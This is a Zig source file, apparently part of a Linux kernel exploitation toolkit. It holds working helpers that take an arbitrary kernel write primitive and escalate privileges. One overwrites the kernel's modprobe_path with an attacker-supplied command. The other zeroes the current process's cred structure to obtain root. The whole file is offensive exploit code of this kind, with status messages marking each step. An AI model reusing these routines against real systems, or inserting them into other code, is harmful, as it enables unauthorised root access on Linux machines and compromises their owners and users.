const std = @import("std");
const ctx_mod = @import("context.zig");
const sym = @import("sym.zig");

fn fn_type(comptime F: type) type {
    return switch (@typeInfo(F)) {
        .Fn => F,
        .Pointer => |p| switch (@typeInfo(p.child)) {
            .Fn => p.child,
            else => @compileError("expected fn or *const fn"),
        },
        else => @compileError("expected fn or *const fn"),
    };
}

fn writer_value_type(comptime Writer: type) type {
    const info = @typeInfo(fn_type(Writer)).Fn;

    if (info.params.len != 2) {
        @compileError("writer must be fn(usize, u32|u64) void");
    }

    const addr_t = info.params[0].type orelse @compileError("writer param0 must have type");
    const val_t = info.params[1].type orelse @compileError("writer param1 must have type");

    if (addr_t != usize) {
        @compileError("writer param0 must be usize address");
    }

    if (val_t != u32 and val_t != u64) {
        @compileError("writer param1 must be u32 or u64");
    }

    return val_t;
}

// requires `CONFIG_STATIC_USERMODEHELPER=n`
pub fn overwrite_modprobe_path(ctx: *const ctx_mod.ctx, cmd: []const u8, writer: anytype) void {
    std.debug.print("[+] overwriting modprobe_path\n", .{});

    const addr = ctx.kaddr(sym.addr_modprobe_path);
    if (addr == sym.dummy_value) {
        std.debug.print("[-] please set addr_modprobe_path\n", .{});
        return;
    }

    const val_t = writer_value_type(@TypeOf(writer));
    const word_size: usize = @sizeOf(val_t);
    const chunk_t = [word_size]u8;

    var i: usize = 0;
    while (i < cmd.len) : (i += word_size) {
        var chunk: chunk_t = std.mem.zeroes(chunk_t);
        const part = cmd[i..@min(i + word_size, cmd.len)];
        @memcpy(chunk[0..part.len], part);

        const v: val_t = std.mem.readInt(val_t, &chunk, .little);
        writer(@as(usize, @intCast(addr)) + i, v);
    }
}

pub fn overwrite_cred(addr_cred: usize, writer: anytype) void {
    std.debug.print("[+] overwriting current->cred\n", .{});

    const val_t = writer_value_type(@TypeOf(writer));
    const word_size: usize = @sizeOf(val_t);

    // Zero out 32 bytes starting from +4, matching the original C version.
    const total: usize = 32;
    var i: usize = 0;
    while (i < (total / word_size)) : (i += 1) {
        writer(addr_cred + 4 + word_size * i, @as(val_t, 0));
    }
}
